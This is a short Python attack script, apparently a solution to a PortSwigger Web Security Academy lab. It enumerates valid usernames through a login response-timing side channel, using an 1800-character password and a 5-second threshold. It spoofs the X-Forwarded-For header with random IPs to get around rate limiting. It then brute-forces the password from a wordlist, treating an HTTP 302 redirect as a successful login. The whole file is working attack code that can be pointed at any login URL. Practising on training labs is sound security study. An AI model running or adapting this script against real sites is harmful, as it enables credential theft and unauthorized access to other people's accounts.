import sys
import requests
import time
import random

def read_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def find_valid_username(url, username_list):
    password = "1" * 1800
    for username in username_list:
        payload = {'username': username, 'password': password}
        headers = {'X-Forwarded-For': f'127.1.0.{random.randint(1, 255)}'}
        start_time = time.time()
        response = requests.post(url, data=payload, headers=headers)
        end_time = time.time()
        if end_time - start_time > 5:
            return username
    return None

def brute_force_password(url, username, password_list):
    for password in password_list:
        payload = {'username': username, 'password': password}
        headers = {'X-Forwarded-For': f'127.1.0.{random.randint(1, 255)}'}
        response = requests.post(url, data=payload, headers=headers, allow_redirects=False)
        if response.status_code == 302:
            return password
    return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1] + '/login'
    username_list = read_file('../Portswigger_lists/username_list.txt')
    password_list = read_file('../Portswigger_lists/password_list.txt')

    valid_username = find_valid_username(burp_url, username_list)
    if valid_username:
        print(f"username: {valid_username}")
        valid_password = brute_force_password(burp_url, valid_username, password_list)
        if valid_password:
            print(f"password: {valid_password}")
        else:
            print("Password not found")
    else:
        print("Username not found")
